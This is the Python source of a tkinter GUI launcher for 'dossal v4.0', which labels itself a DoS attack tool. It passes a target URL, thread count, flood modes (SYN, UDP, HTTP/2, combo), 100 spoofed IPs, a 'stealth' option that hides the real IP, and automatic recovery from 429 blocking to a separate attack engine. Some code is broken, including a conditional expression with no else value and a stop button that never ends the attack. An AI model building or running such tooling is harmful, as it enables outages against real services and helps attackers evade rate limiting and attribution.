#!/usr/bin/env python3
"""
dossal v4.0 — GUI DoS Attack Tool (Windows-first, cross-platform)
Requires: Python 3.8+, h2 (pip install h2)
Run: python dossal_gui.py
"""
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading, json, time, sys, os, subprocess, re

# Import dossal engine
try:
    import dossal
except ImportError:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import dossal

class DossalGUI:
    def __init__(self, root):
        self.root = root
        root.title("dossal v4.0 — DoS Attack Tool")
        root.geometry("600x500")
        root.resizable(True, True)
        
        self.attack_thread = None
        self.running = False
        self.stats = {'rps': 0, 'pps': 0, 'conns': 0, 'errors': 0, 'packets': 0, 'requests': 0}
        self.start_time = 0
        self.duration = 10
        
        self._build_ui()
    
    def _build_ui(self):
        # Main frame
        main = ttk.Frame(self.root, padding=10)
        main.pack(fill=tk.BOTH, expand=True)
        
        # Target section
        target_frame = ttk.LabelFrame(main, text="Target", padding=10)
        target_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(target_frame, text="URL:").grid(row=0, column=0, sticky=tk.W)
        self.url_var = tk.StringVar(value="http://target.com:80")
        self.url_entry = ttk.Entry(target_frame, textvariable=self.url_var, width=50)
        self.url_entry.grid(row=0, column=1, columnspan=2, padx=5, sticky=tk.EW)
        
        ttk.Label(target_frame, text="Duration (sec):").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.dur_var = tk.StringVar(value="10")
        self.dur_entry = ttk.Entry(target_frame, textvariable=self.dur_var, width=10)
        self.dur_entry.grid(row=1, column=1, sticky=tk.W, pady=5)
        
        # Options section
        opt_frame = ttk.LabelFrame(main, text="Options", padding=10)
        opt_frame.pack(fill=tk.X, pady=5)
        
        self.fast_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opt_frame, text="Fast Mode (auto-select best attack)", variable=self.fast_var).grid(row=0, column=0, columnspan=2, sticky=tk.W)
        
        self.spoof_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opt_frame, text="Use Spoofed IPs (100)", variable=self.spoof_var).grid(row=1, column=0, columnspan=2, sticky=tk.W, pady=2)
        
        self.stealth_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opt_frame, text="Stealth Mode (hide real IP)", variable=self.stealth_var).grid(row=2, column=0, columnspan=2, sticky=tk.W, pady=2)
        
        self.recovery_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opt_frame, text="Auto-Recover from 429 (blocked IPs)", variable=self.recovery_var).grid(row=3, column=0, columnspan=2, sticky=tk.W, pady=2)
        
        self.threads_var = tk.StringVar(value="8")
        ttk.Label(opt_frame, text="Threads:").grid(row=4, column=0, sticky=tk.W, pady=2)
        ttk.Entry(opt_frame, textvariable=self.threads_var, width=10).grid(row=4, column=1, sticky=tk.W, pady=2)
        
        # Mode selection (optional, auto if Fast Mode)
        self.mode_var = tk.StringVar(value="auto")
        ttk.Label(opt_frame, text="Mode (auto = smart select):").grid(row=5, column=0, sticky=tk.W, pady=2)
        mode_combo = ttk.Combobox(opt_frame, textvariable=self.mode_var, width=30,
                                    values=['auto', 'raw', 'httpsmp', 'h2', 'udp', 'syn', 'combo'])
        mode_combo.grid(row=5, column=1, sticky=tk.W, pady=2)
        
        # Buttons
        btn_frame = ttk.Frame(main)
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.start_btn = ttk.Button(btn_frame, text="START ATTACK", command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="STOP", command=self.stop_attack, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Save Report", command=self.save_report).pack(side=tk.RIGHT, padx=5)
        
        # Progress bar
        self.progress = ttk.Progressbar(main, orient=tk.HORIZONTAL, length=400, mode='determinate')
        self.progress.pack(fill=tk.X, pady=5)
        
        # Stats frame
        stats_frame = ttk.LabelFrame(main, text="Live Stats", padding=5)
        stats_frame.pack(fill=tk.X, pady=5)
        
        self.rps_label = ttk.Label(stats_frame, text="RPS: 0", font=('Consolas', 10))
        self.rps_label.pack(side=tk.LEFT, padx=10)
        
        self.pps_label = ttk.Label(stats_frame, text="PPS: 0", font=('Consolas', 10))
        self.pps_label.pack(side=tk.LEFT, padx=10)
        
        self.conns_label = ttk.Label(stats_frame, text="Conns: 0", font=('Consolas', 10))
        self.conns_label.pack(side=tk.LEFT, padx=10)
        
        self.err_label = ttk.Label(stats_frame, text="Err: 0", font=('Consolas', 10))
        self.err_label.pack(side=tk.LEFT, padx=10)
        
        # Log
        log_frame = ttk.LabelFrame(main, text="Log", padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=8, font=('Consolas', 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)
    
    def log(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {msg}\n")
        self.log_text.see(tk.END)
        self.log_text.update()
    
    def start_attack(self):
        if self.running:
            return
        
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("Error", "Enter a target URL")
            return
        
        try:
            duration = int(self.dur_var.get())
        except:
            duration = 10
        
        try:
            threads = int(self.threads_var.get())
        except:
            threads = 8
        
        mode = self.mode_var.get()
        fast = self.fast_var.get()
        spoof = self.spoof_var.get()
        stealth = self.stealth_var.get()
        recovery = self.recovery_var.get()
        
        # Build command
        cmd = [sys.executable, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dossal.py')]
        cmd.extend(['--url', url, '--duration', str(duration), '--threads', str(threads)])
        
        if fast:
            cmd.append('--auto')
        elif mode != 'auto':
            cmd.extend(['--mode', mode])
        
        if spoof:
            cmd.extend(['--spoof', '100'])
        if stealth:
            cmd.append('--stealth')
        if recovery:
            cmd.append('--recovery')
        
        self.running = True
        self.start_time = time.time()
        self.duration = duration
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.progress.config(maximum=duration, value=0)
        
        self.log(f"Starting attack: {url}")
        self.log(f"Mode: {mode if not fast else 'auto'} | Threads: {threads} | Duration: {duration}s")
        if spoof:
            self.log("Spoofed IPs: 100")
        if stealth:
            self.log("Stealth: ON")
        if recovery:
            self.log("Recovery: ON")
        
        self.attack_thread = threading.Thread(target=self._run_attack, args=(cmd,), daemon=True)
        self.attack_thread.start()
        
        self._update_stats()
    
    def _run_attack(self, cmd):
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            proc.wait()
            
            # Parse output
            output = proc.stdout.read() if proc.stdout else 
            try:
                js = output[output.find('{'):]
                data = json.loads(js)
                self.stats.update(data)
                self.log(f"Complete: {data.get('rps', 0):,.0f} RPS, {data.get('packets', 0):,} packets")
            except:
                self.log(f"Output: {output[:200]}")
        
        except Exception as e:
            self.log(f"Error: {e}")
        finally:
            self.running = False
            self.root.after(0, self._on_complete)
    
    def _on_complete(self):
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.progress.config(value=self.duration)
        self.log("Attack finished")
    
    def stop_attack(self):
        self.log("Stopping...")
        self.running = False
        # Kill the subprocess (simplified)
        # In production, send SIGTERM or use process group
    
    def _update_stats(self):
        if not self.running:
            return
        
        elapsed = time.time() - self.start_time
        progress = min(elapsed / self.duration * 100, 100)
        self.progress.config(value=progress)
        
        # In production, read live stats from dossal
        # For now, show placeholder
        self.rps_label.config(text=f"RPS: {self.stats.get('rps', 0):,.0f}")
        self.pps_label.config(text=f"PPS: {self.stats.get('packets', 0):,.0f}")
        self.conns_label.config(text=f"Conns: {self.stats.get('connections_made', 0):,.0f}")
        self.err_label.config(text=f"Err: {self.stats.get('errors', 0):,.0f}")
        
        self.root.after(500, self._update_stats)
    
    def save_report(self):
        try:
            from tkinter import filedialog
            path = filedialog.asksaveasfilename(defaultextension='.html', filetypes=[("HTML", "*.html")])
            if path:
                with open(path, 'w') as f:
                    f.write(f"<h1>dossal Report</h1>")
                    f.write(f"<pre>{json.dumps(self.stats, indent=2)}</pre>")
                self.log(f"Report saved: {path}")
        except Exception as e:
            self.log(f"Report error: {e}")

def main():
    root = tk.Tk()
    app = DossalGUI(root)
    root.mainloop()

if __name__ == '__main__':
    main()
